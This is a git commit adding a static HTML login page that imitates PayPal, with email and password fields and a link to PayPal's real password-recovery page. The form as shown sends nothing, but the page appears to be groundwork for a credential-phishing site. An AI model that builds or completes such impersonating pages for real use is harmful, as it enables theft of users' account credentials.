d2e94c5cc39910e39c1e297ae2379a48e6182451
starlin1803 <145172991+starlin1803@users.noreply.github.com>
2023-09-15 21:39:33 -0400

    Create index.php

---
+++ index.php
@@ -0,0 +1,25 @@
+<!DOCTYPE html>
+<html>
+  <head>
+    <meta charset="utf-8">
+    <title>PayPal</title>
+    <link rel="icon" href="logotext.ico">
+    <link rel="stylesheet" href="style.css">
+  </head>
+  <body>
+
+    <div class="login-box">
+      <img src="logologin.png" class="avatar" alt="Avatar Image">
+      <form>
+        <!-- USERNAME INPUT -->
+        <input type="text" placeholder="Email or cell phone number">
+        <!-- PASSWORD INPUT -->
+        <input type="password" placeholder="Password">
+        <input type="submit" value="Log In">
+<div align="center">or</div><br>
+        <input type="submit" value="Register">
+        <p><a href="https://www.paypal.com/authflow/password-recovery/?country.x=DO&locale.x=es_XC&redirectUri=%252Fsignin">¿Lost your Password?</a></p>
+      </form>
+    </div>
+  </body>
+</html>
